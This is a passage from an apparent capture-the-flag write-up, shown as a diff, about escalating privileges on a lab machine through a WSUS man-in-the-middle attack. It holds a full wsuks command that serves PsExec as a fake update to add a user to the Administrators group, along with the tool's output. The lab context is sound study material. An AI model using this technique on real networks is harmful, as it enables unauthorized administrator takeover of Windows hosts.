@@ -846,6 +846,33 @@ Ill use the wsusk tool to do this just like the above digitrace article
 Then just following the POC ill convert the PFX to a PEM, now this can be used in wsuks to execute a command as the administrator
 
 ```python
+sudo wsuks --WSUS-Server wsus.logging.htb --tls-cert wsus.pem -I tun0 --serve-only -c '/accepteula /s powershell.exe "net localgroup Administrators wallace.everette /add"'
 
+    __          __ _____  _    _  _  __  _____
+    \ \        / // ____|| |  | || |/ / / ____|
+     \ \  /\  / /| (___  | |  | || ' / | (___
+      \ \/  \/ /  \___ \ | |  | ||  <   \___ \
+       \  /\  /   ____) || |__| || . \  ____) |
+        \/  \/   |_____/  \____/ |_|\_\|_____/
+
+     Pentesting Tool for the WSUS MITM Attack
+               Made by NeffIsBack
+                 version: 1.2.2
+
+[+] Command to execute: 
+PsExec64.exe /accepteula /s powershell.exe "net localgroup Administrators wallace.everette /add"
+[*] ===== Starting Web Server =====
+[*] Using TLS certificate 'wsus.pem' for HTTPS WSUS Server
+[*] Starting WSUS Server on 10.10.14.61:8531...
+[*] Serving executable as KB: 9650056
+[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig"
+[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"
+[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/SyncUpdates"
+[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"
+[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetExtendedUpdateInfo"
+[+] Received GET request: /2cead5a0-cde3-4389-9e62-2903f783d585/PsExec64.exe
+[+] GET request for exe: /2cead5a0-cde3-4389-9e62-2903f783d585/PsExec64.exe
 ```
+
+Ill run 
 
